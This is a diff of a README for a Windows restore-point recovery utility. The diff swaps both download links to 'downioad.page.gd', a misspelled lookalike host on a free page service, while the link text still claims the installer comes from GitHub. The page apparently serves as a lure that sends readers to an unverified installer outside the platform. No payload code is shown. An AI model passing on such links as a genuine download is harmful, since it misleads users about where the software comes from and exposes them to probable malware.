@@ -2,7 +2,7 @@
 
 Windows Restore Point Recovery is a dedicated tool designed to help you locate, recover, and manage system restore points on Windows 10 and Windows 11. If you've ever found that a critical restore point has vanished or system restore isn't working as expected, this utility provides a straightforward way to diagnose and recover your system's safety net.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -36,6 +36,6 @@ A: The repair function is designed to be safe and non-destructive. It only attem
 
 ## Download
 
-[Get the latest version from GitHub](https://download-page.page.gd/)
+[Get the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: October 2026*
